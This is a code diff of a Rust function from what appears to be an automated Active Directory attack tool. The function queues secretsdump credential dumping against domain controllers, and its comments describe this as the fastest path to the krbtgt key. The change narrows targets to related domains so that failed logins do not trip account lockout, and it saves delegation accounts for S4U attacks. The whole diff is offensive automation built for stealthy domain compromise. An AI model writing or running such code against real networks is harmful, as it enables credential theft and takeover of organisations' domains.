@@ -31,26 +31,40 @@ pub async fn auto_local_admin_secretsdump(
         // Do NOT gate on is_admin — the credential may have admin rights we
         // haven't confirmed yet. Secretsdump will fail fast if it lacks
         // privileges, but when it succeeds it's the fastest path to krbtgt.
+        // IMPORTANT: only target DCs in the credential's domain (or child
+        // domains). Cross-domain secretsdump attempts generate failed auths
+        // that trigger AD account lockout.
         let work: Vec<(String, String, ares_core::models::Credential)> = {
             let state = dispatcher.state.read().await;
             let creds: Vec<_> = state
                 .credentials
                 .iter()
                 .filter(|c| !c.domain.is_empty() && !c.password.is_empty())
+                // Skip delegation accounts — secretsdump will always fail
+                // (non-admin) and wastes auth budget reserved for S4U.
+                .filter(|c| c.is_admin || !state.is_delegation_account(&c.username))
                 .cloned()
                 .collect();
 
             let mut items = Vec::new();
             for cred in &creds {
-                for dc_ip in state.domain_controllers.values() {
-                    let dedup = format!(
-                        "{}:{}:{}",
-                        dc_ip,
-                        cred.domain.to_lowercase(),
-                        cred.username.to_lowercase()
-                    );
-                    if !state.is_processed(DEDUP_SECRETSDUMP, &dedup) {
-                        items.push((dedup, dc_ip.clone(), cred.clone()));
+                let cred_domain = cred.domain.to_lowercase();
+                for (dc_domain, dc_ip) in state.domain_controllers.iter() {
+                    let d = dc_domain.to_lowercase();
+                    // Same domain, child domain, or parent domain
+                    if d == cred_domain
+                        || d.ends_with(&format!(".{cred_domain}"))
+                        || cred_domain.ends_with(&format!(".{d}"))
+                    {
+                        let dedup = format!(
+                            "{}:{}:{}",
+                            dc_ip,
+                            cred.domain.to_lowercase(),
+                            cred.username.to_lowercase()
+                        );
+                        if !state.is_processed(DEDUP_SECRETSDUMP, &dedup) {
+                            items.push((dedup, dc_ip.clone(), cred.clone()));
+                        }
                     }
                 }
             }
